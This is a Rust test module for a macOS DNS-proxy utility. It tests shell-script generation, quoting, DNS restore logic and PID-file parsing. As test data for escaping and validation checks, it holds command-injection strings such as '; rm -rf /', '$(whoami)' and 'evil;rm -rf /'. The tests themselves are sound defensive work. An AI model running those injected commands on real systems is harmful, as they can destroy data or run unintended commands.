        // Layer 5: networksetup 必须在 kill -0 校验通过之后
        let kill_zero_pos = script.find("kill -0").expect("kill -0 missing");
        let networksetup_pos = script
            .find("networksetup -setdnsservers")
            .expect("networksetup missing");
        assert!(
            kill_zero_pos < networksetup_pos,
            "networksetup must run AFTER kill -0 (kill_zero={kill_zero_pos} \
             networksetup={networksetup_pos}), otherwise DNS points to black hole"
        );

        // Layer 6 (F4): EXIT trap 注册 + 在 networksetup 成功后才 disarm
        assert!(
            script.contains("trap cleanup EXIT"),
            "F4: EXIT trap must be registered before spawning proxy"
        );
        assert!(
            script.contains("trap - EXIT"),
            "F4: trap must be disarmed after networksetup succeeds"
        );
        // disarm 必须在 networksetup 之后
        let networksetup_end = script
            .find("networksetup -setdnsservers")
            .map(|p| {
                script[p..]
                    .find('\n')
                    .map(|nl| p + nl)
                    .unwrap_or(script.len())
            })
            .unwrap();
        let disarm_pos = script.find("trap - EXIT").expect("disarm missing");
        assert!(
            disarm_pos > networksetup_end,
            "disarm must come AFTER networksetup succeeds (disarm={disarm_pos} \
             networksetup_end={networksetup_end})"
        );

        // Layer 7 (F2): 所有 path 都用 single-quote 注入；运行变量都是双引号访问
        assert!(
            script.contains(&format!(
                "PROXY={}",
                shell_single_quote(&proxy.to_string_lossy())
            )),
            "F2: PROXY must be single-quoted (path with spaces)"
        );
        assert!(
            script.contains(&format!(
                "PID_FILE={}",
                shell_single_quote(&pid_file.to_string_lossy())
            )),
            "F2: PID_FILE must be single-quoted"
        );
        assert!(
            script.contains(&format!(
                "LOG_FILE={}",
                shell_single_quote(&log_path.to_string_lossy())
            )),
            "F2: LOG_FILE must be single-quoted"
        );
        assert!(
            script.contains(&format!("IFACE='{interface}'")),
            "F2: IFACE must be single-quoted (interface with spaces)"
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    // -----------------------------------------------------------------------
    // shell_single_quote 单元测试（F2, PR #156 review）
    // -----------------------------------------------------------------------

    #[test]
    fn test_shell_single_quote_basic() {
        assert_eq!(shell_single_quote("hello"), "'hello'");
        assert_eq!(shell_single_quote("/usr/bin/foo"), "'/usr/bin/foo'");
        assert_eq!(shell_single_quote(""), "''");
    }

    #[test]
    fn test_shell_single_quote_with_apostrophe() {
        // POSIX 单引号包裹里内嵌 ' 必须用 '\'' 三段拼接
        assert_eq!(shell_single_quote("can't"), "'can'\\''t'");
        // 路径里有引号
        assert_eq!(
            shell_single_quote("/foo/'bar'/baz"),
            "'/foo/'\\''bar'\\''/baz'"
        );
    }

    #[test]
    fn test_shell_single_quote_injection_safe() {
        // shell metacharacters 在单引号包裹下都是字面量
        let evil_inputs = [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "$PATH",
            "foo && bar",
            "foo | bar",
            "foo > /etc/passwd",
            "foo\nbar",
            "\\x00\\x01",
        ];
        for input in evil_inputs {
            let quoted = shell_single_quote(input);
            // 关键是：input 字符串中除了 ' 以外的字符都不应该有 escape；
            // shell eval 时单引号包裹确保任何字节都按字面量解析
            assert!(
                quoted.starts_with('\'') && quoted.ends_with('\''),
                "shell_single_quote({input:?}) must be wrapped in single quotes; got {quoted}"
            );
            // 通过 POSIX 测试：对 quoted 中的非 ' 部分脱壳后应该等于 input
            // 这里抽简化断言：quoted 中的每个字符（去掉最外层单引号和中间 '\'' 三段）可逆
            let mut s = quoted.as_str();
            assert!(s.starts_with('\'') && s.ends_with('\''));
            s = &s[1..s.len() - 1];
            // 抽出 \' 三段替换回 '
            let restored = s.replace(r"'\''", "'");
            assert_eq!(restored, input, "quoting for {input:?} must round-trip");
        }
    }

    // -----------------------------------------------------------------------
    // build_enable_script 端到端执行（F1, PR #156 review）
    // -----------------------------------------------------------------------

    /// 回归测试（issue #155 + F1）：**直接消费生产 builder 的输出**
    /// 写到 disk + 用 /bin/sh 执行，验证「proxy binary 不存在」时退出 127。
    ///
    /// 这是 #155 根因的核心回归。之前的 `set -e + cmd &` 静默吞错让
    /// osascript 返回 0 → enable_dns_mode 返回 Ok → 前端报成功但 53 端口
    /// 没 listener。本测试通过真实 sh 执行确保：
    ///   1. 缺失 binary 时脚本**不**像 old 那样退出 0
    ///   2. stderr 含清晰错误信息（含 missing path）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_loudly_fails_when_proxy_missing() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        // 用 tempdir 在 /tmp 下；proxy 路径**故意不创建文件**
        let dir = tempfile::tempdir().unwrap();
        let fake_proxy = dir.path().join("mhost-dns-proxy-does-not-exist");
        let pid_file = dir.path().join("proxy.pid");
        let log_path = dir.path().join("proxy.log");

        // 关键：消费生产 builder，不是自己 format!
        let script_body = build_enable_script(&EnableScriptInputs {
            proxy_path: &fake_proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: "Wi-Fi",
        });

        let path = std::env::temp_dir().join(format!(
            "mhost-dns-enable-test-{}-{}.sh",
            std::process::id(),
            3
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, &script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 关键断言：脚本退出 127，而不是 old buggy 行为的 0
        assert_eq!(
            output.status.code(),
            Some(127),
            "missing binary should make script exit 127; got {:?}; \
             stderr=\"{}\" stdout=\"{}\"",
            output.status.code(),
            String::from_utf8_lossy(&output.stderr),
            String::from_utf8_lossy(&output.stdout),
        );
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            stderr.contains("not executable"),
            "stderr must include 'not executable' for users; got: {stderr}"
        );
        // single-quote 包裹后，路径字符串里 fake_proxy 应当完整出现在 stderr
        assert!(
            stderr.contains(fake_proxy.to_string_lossy().as_ref()),
            "stderr must include the missing path so user knows which file; got: {stderr}"
        );

        // EXIT trap 应清掉 PID 文件（虽然这里 proxy 根本没启动，trap 的
        // PROXY_PID 还是空，但 rm -f "$PID_FILE" 仍然执行一次，无害）
        assert!(
            !pid_file.exists(),
            "F4: PID file should be cleaned up even on Layer 1 exit path"
        );
    }

    /// 回归测试（F1）：路径含空格 + 接口名含空格时，脚本能正确把路径
    /// 传给后续 shell 工具而不被 word splitting 截断。
    ///
    /// 模拟 macOS 默认路径 `~/Library/Application Support/mHost/...`，
    /// 验证：
    ///   1. 脚本生成出来后 `~/Library/Application` 这种 sub-string 永远不会
    ///      裸出现（必须被 `'…'` 包裹）
    ///   2. 真正执行时（缺失 proxy 会走 Layer 1 fail），stderr 包含完整路径
    ///      —— 而不是被截断成 `~/Library/Application`
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_with_spaces_in_path_loudly_fails() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        // 路径含两个空格 + 接口名含一个空格
        let dir = tempfile::Builder::new()
            .prefix("mhost enable script test")
            .tempdir()
            .unwrap();
        let proxy_with_space = dir.path().join("proxy binary");
        let pid_with_space = dir.path().join("pid file");
        let log_with_space = dir.path().join("log file");
        let interface_with_space = "Thunderbolt Ethernet";

        let script_body = build_enable_script(&EnableScriptInputs {
            proxy_path: &proxy_with_space,
            dns_port: 1053,
            pid_file: &pid_with_space,
            log_path: &log_with_space,
            interface: interface_with_space,
        });

        // F2 静态保证：脚本里所有含空格的 path 必须被 single-quote 包裹
        // 不能裸出现
        let unquoted_path_str = proxy_with_space.to_string_lossy();
        // 找到第一个空格之后的子串（"mhost enable..."）—— 必须整个在 '…' 之内
        if let Some(_space_idx) = unquoted_path_str.find(' ') {
            // 这个子串不应该在脚本里裸出现（在某两个 ' 之间）
            // 我们接受它在 quoted form 里，但不允许 "*...$ unquoted form..."
            // 简化断言：全路径必须以 single-quote 边界包围
            let quoted = shell_single_quote(&unquoted_path_str);
            assert!(
                script_body.contains(&quoted),
                "F2: path with spaces must be single-quoted in script; expected {quoted:?} in {script_body}"
            );
        }

        // 真正执行：缺失 binary → 走 Layer 1 → 退出 127
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-enable-spaces-test-{}.sh",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, &script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        assert_eq!(
            output.status.code(),
            Some(127),
            "spaces-in-path script should still exit 127 on missing proxy; \
             got stderr=\"{}\"",
            String::from_utf8_lossy(&output.stderr),
        );
        let stderr = String::from_utf8_lossy(&output.stderr);
        // 关键 F2 断言：完整路径（带空格）必须出现在 stderr，证明 quoting 起效
        assert!(
            stderr.contains(unquoted_path_str.as_ref()),
            "F2: stderr must contain FULL path including spaces (proves quoting didn't truncate); \
             got stderr=\"{stderr}\""
        );
        // 反向断言：用 simple sh 词法模拟器跑一次脚本，看 stderr 是不是
        // 因为 word splitting 被截断。这里不强求（bash 行为复杂），改为
        // 静态检查：script 里所有含空格 path 必须被 single-quote 包裹
        // （这部分在 test_enable_script_contains_safety_layers 已覆盖）。
        // 这里只验证 dynamic exec 的不可截断性。
        if let Some(space_idx) = unquoted_path_str.find(' ') {
            // 截断检测：stderr 末尾不应该停在 `<truncated> \n` 这种状态
            // （即：被 truncate 后残留的 prefix + space + \n）
            let truncated_with_space = format!("{} ", &unquoted_path_str[..space_idx]);
            assert!(
                !stderr.trim_end().ends_with(truncated_with_space.trim_end()),
                "F2: stderr ended at '{truncated_with_space}' which suggests path was truncated \
                 at the space; full={unquoted_path_str:?} got stderr={stderr:?}"
            );
        }
    }

    /// **fix (issue #152, root cause 2)**: `networksetup_get_dns` must strip
    /// **fix (issue #152 hardening, Step 3)**：post-restore 验证纯逻辑。
    /// `any_local_resolver(&Vec<String>)` 是 `verify_dns_restored_against_loopback`
    /// 内部的纯函数，单元测试可覆盖。`networksetup_get_dns` 本身要走
    /// `Command::new`，纯单测跑不到，但 filter 逻辑就是
    /// `into_iter().filter(|s| !is_local_resolver(s))`，已由
    /// `test_is_local_resolver_*` + `test_parse_dns_servers_then_filter_loopback`
    /// 覆盖。
    #[test]
    fn test_post_restore_verify_helper_detects_loopback() {
        // 无 loopback → 安全（Ok(true) at 调用方）
        assert!(!any_local_resolver(&[]));
        assert!(!any_local_resolver(&["8.8.8.8".to_string()]));
        assert!(!any_local_resolver(&[
            "8.8.8.8".to_string(),
            "1.1.1.1".to_string()
        ]));

        // 任何 loopback 出现 → 升级兜底
        assert!(any_local_resolver(&["127.0.0.1".to_string()]));
        assert!(any_local_resolver(&["::1".to_string()]));
        assert!(any_local_resolver(&["0.0.0.0".to_string()]));
        // 混合：只要有一个 loopback 就算失败
        assert!(any_local_resolver(&[
            "127.0.0.1".to_string(),
            "8.8.8.8".to_string()
        ]));
        // host:port 形式也算
        assert!(any_local_resolver(&[
            "127.0.0.1:53".to_string(),
            "8.8.8.8".to_string()
        ]));
    }

    /// **fix (issue #152, root cause 2)**：`networksetup_get_dns` 的内部
    /// 行为 —— `parse_dns_servers` 输出后必须 filter 掉 loopback。
    /// 这是行为测试（不是 source-grep）：直接构造 parse + filter 流水线，
    /// 覆盖 wrapper 的语义。
    #[test]
    fn test_networksetup_get_dns_filter_pipeline() {
        // 模拟「DNS mode 启用后 networksetup -getdnsservers」输出
        let raw = parse_dns_servers("127.0.0.1\n1.1.1.1\n").unwrap();
        let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
        assert_eq!(filtered, vec!["1.1.1.1".to_string()]);

        // 全部 loopback → filter 后空 → 调用方应退回 DhcpEmpty
        let raw = parse_dns_servers("127.0.0.1\n::1\n0.0.0.0\n").unwrap();
        let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
        assert!(filtered.is_empty());

        // 没 loopback → 原样保留
        let raw = parse_dns_servers("8.8.8.8\n1.1.1.1\n").unwrap();
        let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
        assert_eq!(filtered, vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()]);
    }

    /// **fix (issue #152, root cause 1)**: `try_recover_dns` must read the
    /// recovery marker via `disable_recovery_marker_file()`, NOT from a
    /// hard-coded `/tmp/...` path. The disable path writes to the former;
    /// the recovery path used to read from the latter. The two sides have
    /// always disagreed on the path, making the recovery branch dead code.
    ///
    /// `state/mod.rs` and `platform.rs` live in different crates, so we
    /// use the source-grep technique to verify the reader path.
    #[test]
    fn test_try_recover_dns_reads_canonical_marker_path() {
        let state_src = include_str!("../../../src/state/mod.rs");
        assert!(
            !state_src.contains("/tmp/mhost-dns-disable-recovery.marker"),
            "state/mod.rs try_recover_dns must not hard-code /tmp/... for the recovery \
             marker (issue #152). Use mhost_dns::platform::disable_recovery_marker_file() \
             instead."
        );
        assert!(
            state_src.contains("disable_recovery_marker_file()"),
            "state/mod.rs try_recover_dns must call \
             mhost_dns::platform::disable_recovery_marker_file() to locate the recovery \
             marker (issue #152)"
        );
    }

    /// **fix (issue #152 hardening)**：disable 路径写 marker 的位置和
    /// try_recover_dns 读 marker 的位置必须在同一路径（同一个 helper），
    /// 否则再次出现「写一处、读另一处 → recovery branch 是死代码」。
    /// 行为测试（不是 source-grep）：验证 helper 自洽。
    #[test]
    fn test_disable_recovery_marker_file_path_is_canonical() {
        let path = disable_recovery_marker_file();
        // 必须不是 `/tmp/...`
        assert!(
            !path.starts_with("/tmp/"),
            "recovery marker path must not live in /tmp; got {}",
            path.display()
        );
        // 必须在 runtime_dir() 下
        let runtime = runtime_dir();
        assert!(
            path.starts_with(&runtime),
            "recovery marker must live under runtime_dir ({}); got {}",
            runtime.display(),
            path.display()
        );
        // 文件名必须是固定的 marker 名
        assert!(
            path.file_name().and_then(|n| n.to_str()) == Some("mhost-dns-disable-recovery.marker"),
            "recovery marker filename must be mhost-dns-disable-recovery.marker; got {:?}",
            path.file_name()
        );
    }

    /// 回归测试（fix: code review B1）：disable_dns_mode 脚本必须有 `set -e`，
    /// 否则最后一行 `rm -f` 永远成功，掩盖 networksetup 失败的退出码。
    ///
    /// 通过 shell 真实执行来验证。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_propagates_networksetup_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        // 模拟「networksetup 失败」+ 「kill 找不到 PID」+ 「rm 不存在的文件」
        // 三个命令链的 disable 脚本。
        let script_body = r#"#!/bin/sh
set -e
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            1
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 有 set -e：/bin/false 失败让脚本立即退出（exit code 1）
        assert_eq!(
            output.status.code(),
            Some(1),
            "set -e + /bin/false should make script exit 1; stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// 反向验证：没有 set -e 时 disable 脚本会错误地退出 0（掩盖 networksetup 失败）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_without_set_e_hides_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        let script_body = r#"#!/bin/sh
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            2
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 没有 set -e：最后一行 rm 成功，脚本退出 0，掩盖 /bin/false 的失败
        assert_eq!(
            output.status.code(),
            Some(0),
            "without set -e, the last `rm -f` masks the /bin/false failure"
        );
    }

    #[test]
    fn test_parse_pid_file_with_binary_path() {
        // 验证 cleanup_stale_proxy 的 split_whitespace 解析逻辑
        let content = "12345 /usr/local/bin/mhost-dns-proxy\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        let binary = parts.next().unwrap();
        assert_eq!(pid, 12345);
        assert_eq!(binary, "/usr/local/bin/mhost-dns-proxy");
    }

    #[test]
    fn test_parse_pid_file_legacy_format() {
        // 老 PID 文件只有 PID（无 binary 路径）—— 仍然能解析 PID，
        // 但 cleanup 校验会失败（因为拿不到 binary 路径用于 ps）。
        // 这是预期行为：遗留的 PID 文件会被 cleanup 安全跳过（kill 0 仍走）。
        let content = "12345\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        assert_eq!(pid, 12345);
        let binary = parts.next();
        assert!(binary.is_none(), "老格式没有 binary 路径");
    }

    #[test]
    fn test_process_name_contains_proxy_marker() {
        // fix（systematic review）：之前用 contains() 模糊匹配，攻击者
        // 进程名 `not-mhost-dns-proxy` 也会被错杀。现在改用精确比较：
        // 两侧都取 basename 后做相等比较，跨 macOS（comm=full path）/
        // Linux（comm=basename）一致。
        let cases = [
            // (recorded_binary_path, ps_comm, expected_is_proxy)
            (
                "/usr/local/bin/mhost-dns-proxy",
                "/usr/local/bin/mhost-dns-proxy\n",
                true,
            ),
            ("/usr/local/bin/mhost-dns-proxy", "mhost-dns-proxy\n", true), // Linux ps basename
            // 攻击者场景：进程名含 mhost-dns-proxy 但不是同一个二进制
            (
                "/usr/local/bin/mhost-dns-proxy",
                "not-mhost-dns-proxy\n",
                false,
            ),
            // 完全不相关的进程
            ("/usr/local/bin/mhost-dns-proxy", "/bin/sh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "/usr/bin/ssh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "cargo\n", false),
        ];
        for (recorded, ps_line, expected) in &cases {
            // 模拟 cleanup_stale_proxy 的精确比较逻辑
            let expected_comm = std::path::Path::new(recorded)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| recorded.to_string());
            let comm_basename = std::path::Path::new(ps_line.trim())
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| ps_line.trim().to_string());
            let is_proxy = comm_basename == expected_comm;
            assert_eq!(
                is_proxy, *expected,
                "recorded={:?}, ps={:?}, expected_comm={:?}, ps_basename={:?}",
                recorded, ps_line, expected_comm, comm_basename
            );
        }
    }

    // -----------------------------------------------------------------------
    // read_proxy_expected_basename 单元测试（fix PR #164 review nit #8）
    //
    // 之前只有 `test_disable_dns_mode_passes_pid_to_osascript_restore`
    // 间接验证这个函数；本组测试覆盖 5 种典型 / 边界场景，让回归有
    // 直接 contract guard。所有测试走 `serial_runtime_dir_test` 锁 +
    // `EnvRestore::snapshot` 模式，与同模块其他 pid-file 测试一致。
    // -----------------------------------------------------------------------

    /// 新格式：`"12345 /usr/local/bin/mhost-dns-proxy\n"` →
    /// 返回 `Some("mhost-dns-proxy")`。
    #[test]
    fn test_read_proxy_expected_basename_new_format() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        std::fs::write(proxy_pid_file(), "12345 /usr/local/bin/mhost-dns-proxy\n").unwrap();

        assert_eq!(
            read_proxy_expected_basename(),
            Some("mhost-dns-proxy".to_string()),
        );
    }

    /// 老格式：`"12345\n"`（仅 PID，无 binary 路径）→ 返回 `None`。
    #[test]
    fn test_read_proxy_expected_basename_legacy_format() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        std::fs::write(proxy_pid_file(), "12345\n").unwrap();

        assert_eq!(read_proxy_expected_basename(), None);
    }

    /// 第二字段是空白字符串：`"12345 \n"` → split_whitespace 后第二个
    /// token 不存在 → 返回 `None`（与 legacy_format 等价路径）。
    #[test]
    fn test_read_proxy_expected_basename_empty_second_field() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        std::fs::write(proxy_pid_file(), "12345 \n").unwrap();

        assert_eq!(read_proxy_expected_basename(), None);
    }

    /// PID 文件不存在 → 返回 `None`（runtime_dir 指向空 tempdir）。
    #[test]
    fn test_read_proxy_expected_basename_no_pid_file() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // dir 是空的，proxy_pid_file() 在其下不存在
        assert!(!proxy_pid_file().exists());

        assert_eq!(read_proxy_expected_basename(), None);
    }

    /// **fix (PR #164 review concern #3)**：recorded binary path 含
    /// shell metacharacter → basename charset 校验拒绝 → 返回 `None`。
    /// 这是防御深度：basename 应该只是合法 binary 名（字母/数字/._-），
    /// 出现 `;` / ` ` / `'` / `/` 等都是 PID 文件被破坏的信号，宁可走
    /// "无预期 basename" 路径（= legacy arm = stderr WARNING）也不冒险。
    #[test]
    fn test_read_proxy_expected_basename_rejects_non_basename_chars() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // 反向 case：注入字符
        std::fs::write(proxy_pid_file(), "12345 evil;rm -rf /\n").unwrap();
        assert_eq!(
            read_proxy_expected_basename(),
            None,
            "PID file with shell metacharacters must be rejected"
        );

        // 正向 case：合法 basename（连字符、下划线、点都允许）
        std::fs::write(proxy_pid_file(), "12345 /path/with-dashes_and.dots\n").unwrap();
        assert_eq!(
            read_proxy_expected_basename(),
            Some("with-dashes_and.dots".to_string()),
            "PID file with valid basename charset must return basename"
        );
    }
    // -----------------------------------------------------------------------
    // 端到端执行测试基础设施 + 测试（issue #158）
    //
    // F1/F2 fix（PR #156 review）已经把 build_enable_script 抽出成
    // pub(crate)，结构测试都直接消费生产 builder。但「执行测试」只覆盖
    // Layer 1 fail（binary 缺失）—— 成功路径 / bind 失败 / networksetup
    // 失败 / 路径含空格端到端 这些场景都没跑过 production builder 的真实
    // 输出。这里补一组端到端执行测试，方法：
    //
    //   1. 在 tempdir 里写 fake `mhost-dns-proxy`（参数 caller 给，可控
    //      行为：长跑 / 立即退出 / 延迟启动）+ fake `networksetup`（写参数
    //      到 log + caller 控制 exit code）
    //   2. 把 tempdir 加到 PATH 前面，fake `networksetup` 通过 PATH 解析生效
    //   3. fake `mhost-dns-proxy` 用 full path 传入（不走 PATH）
    //   4. 真实执行 build_enable_script() 的产物（不是手 format! 出来的）
    //
    // 这些测试守护 #155 的根因：旧 `set -e + cmd & echo "$! ..."` 形式
    // 会让 osascript 返回 0 但 53 端口没 listener —— 一个显式违反契约的
    // silent failure。本组测试用 production builder + fake binaries 模拟
    // 各种边界，确保修过的代码路径真的触发且修过。
    // -----------------------------------------------------------------------

    /// RAII env-var restore（fix #158）：任何修改 MHOST_RUNTIME_DIR / PATH
    /// 的测试都应持一个 `EnvRestore::snapshot()`，避免中途 panic 时污染
    /// 全局 env，导致后续测试 race / 失败。
    ///
    /// PR #164 review (blocker #2)：fake `ps` 基础设施额外设了
    /// `MHOST_TEST_PS_MAP_FILE`（指向 per-test PID→comm map 文件），
    /// 也纳入 restore 范围。
    struct EnvRestore {
        saved_runtime_dir: Option<String>,
        saved_path: Option<String>,
        saved_ps_map_file: Option<String>,
    }

    impl EnvRestore {
        fn snapshot() -> Self {
            Self {
                saved_runtime_dir: std::env::var("MHOST_RUNTIME_DIR").ok(),
                saved_path: std::env::var("PATH").ok(),
                saved_ps_map_file: std::env::var("MHOST_TEST_PS_MAP_FILE").ok(),
            }
        }
    }

    impl Drop for EnvRestore {
        fn drop(&mut self) {
            match self.saved_runtime_dir.take() {
                Some(v) => std::env::set_var("MHOST_RUNTIME_DIR", v),
                None => std::env::remove_var("MHOST_RUNTIME_DIR"),
            }
            match self.saved_path.take() {
                Some(v) => std::env::set_var("PATH", v),
                None => std::env::remove_var("PATH"),
            }
            // PR #164 review (blocker #2): fake `ps` infra installs this env
            // var pointing at the per-test PID→comm map file. Tests that
            // touched it must restore / clear it on drop, otherwise parallel
            // tests pick up a stale map and fail with phantom comm matches.
            match self.saved_ps_map_file.take() {
                Some(v) => std::env::set_var("MHOST_TEST_PS_MAP_FILE", v),
                None => std::env::remove_var("MHOST_TEST_PS_MAP_FILE"),
            }
        }
    }
    // -----------------------------------------------------------------------
    // Force TCC re-prompt every time (defeat TCC cache)
    // -----------------------------------------------------------------------
    //
    // **fix (issue follow-up)**:`spawn_osascript` 的 AppleScript 命令必须
    // 每次带不同 nonce,否则 macOS TCC 在 5min 缓存窗口内会静默放行,
    // 用户看到「没弹授权框」但实际上 enable 已经完成,造成 UI 状态混乱
    // (用户以为卡住,其实 mhost 在 OS 层面已经 enabled)。

    /// 纯函数:每次生成的 AppleScript 命令必须包含传入的 nonce。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_build_osascript_command_includes_nonce() {
        let cmd = super::build_osascript_command("/tmp/mhost-script.sh", "abc123def");
        assert!(
            cmd.contains("abc123def"),
            "command must include nonce, got: {}",
            cmd
        );
        assert!(
            cmd.contains("/tmp/mhost-script.sh"),
            "command must include script path"
        );
        assert!(
            cmd.contains("with administrator privileges"),
            "must still request TCC elevation"
        );
    }

    /// 纯函数:不同 nonce 必须生成不同命令(否则 nonce 就没意义了)。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_build_osascript_command_unique_per_nonce() {
        let cmd1 = super::build_osascript_command("/tmp/x.sh", "nonce-aaa");
        let cmd2 = super::build_osascript_command("/tmp/x.sh", "nonce-bbb");
        assert_ne!(
            cmd1, cmd2,
            "different nonces must yield different commands (otherwise \
             TCC cache bypass is not defeated)"
        );
    }

    /// 路径含双引号时必须正确转义(防御性 —— 正常 temp path 不会含,但
    /// $TMPDIR 自定义 / ~/ 路径含特殊字符理论上可能)。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_build_osascript_command_escapes_quotes_in_path() {
        let cmd = super::build_osascript_command("/tmp/has\"quote.sh", "abc");
        // 双引号在 AppleScript 字符串里需要 \"(注意:AppleScript parser
        // 把 \" 视为字面 ",不是 delimiter)
        assert!(
            cmd.contains("has\\\"quote.sh"),
            "double quote must be escaped to \\\", got: {}",
            cmd
        );
        // 路径里 literal " 字符必须仍然存在(只是被 \ 转义,不能消失)
        let original_quote_count = "/tmp/has\"quote.sh".matches('"').count();
        let escaped_quote_count = cmd.matches("\\\"").count();
        assert_eq!(
            original_quote_count, escaped_quote_count,
            "every input quote must produce exactly one escaped quote in output"
        );
    }

    /// 路径含反斜杠时也正确转义。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_build_osascript_command_escapes_backslash_in_path() {
        let cmd = super::build_osascript_command("/tmp/has\\back.sh", "abc");
        // 反斜杠在 AppleScript 字符串里需要 \\
        assert!(
            cmd.contains("has\\\\back.sh"),
            "backslash must be escaped: {}",
            cmd
        );
    }

    /// nonce 的纯随机源必须足够唯一 —— 连续两次调用 spawn_osascript
    /// 拿到的 nonce 必须不同(否则 mhost 在 1 秒内连点两次 Enable 会
    /// 拿到同一 nonce → TCC 还是缓存命中 → 还是看不到 prompt)。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_generate_nonce_is_unique_across_calls() {
        let n1 = super::generate_nonce();
        let n2 = super::generate_nonce();
        let n3 = super::generate_nonce();
        assert!(!n1.is_empty(), "nonce must be non-empty");
        assert_ne!(n1, n2, "nonce must differ across calls");
        assert_ne!(n2, n3, "nonce must differ across calls");
        assert_ne!(n1, n3, "nonce must differ across calls");
    }

    /// Fake-binary 测试基础设施（fix #158）：写 fake `mhost-dns-proxy` +
    /// fake `networksetup` 到 tempdir，把 tempdir 加到 PATH 前面。
    ///
    /// 返回 `(TempDir, fake_bin_path)`。TempDir drop 时清理 fake_bin
    /// 目录，但 fake proxy 通过 `disown` 后是 detached 进程，caller 仍
    /// 需自己 SIGTERM 清理（见 `kill_proxy_from_pid_file`）。
    ///
    /// **必须**持 `serial_runtime_dir_test()` 锁 —— 这函数改 PATH，
    /// 和 proxy.rs 测试改 MHOST_RUNTIME_DIR 必须串行化。
    #[cfg(target_os = "macos")]
    fn setup_fake_bin_env(
        proxy_contents: &str,
        networksetup_contents: &str,
    ) -> (tempfile::TempDir, PathBuf) {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let dir = tempfile::Builder::new()
            .prefix("mhost-fake-bin")
            .tempdir()
            .unwrap();
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();

        for (name, contents) in [
            ("mhost-dns-proxy", proxy_contents),
            ("networksetup", networksetup_contents),
        ] {
            let path = bin.join(name);
            let mut f = std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o755)
                .open(&path)
                .unwrap();
            f.write_all(contents.as_bytes()).unwrap();
            f.sync_all().unwrap();
        }

        // 把 fake bin 加到 PATH 前面 → bare `networksetup` 调用 resolve 到 fake
        let original_path = std::env::var("PATH").unwrap_or_default();
        let new_path = format!("{}:{}", bin.display(), original_path);
        std::env::set_var("PATH", &new_path);

        (dir, bin)
    }

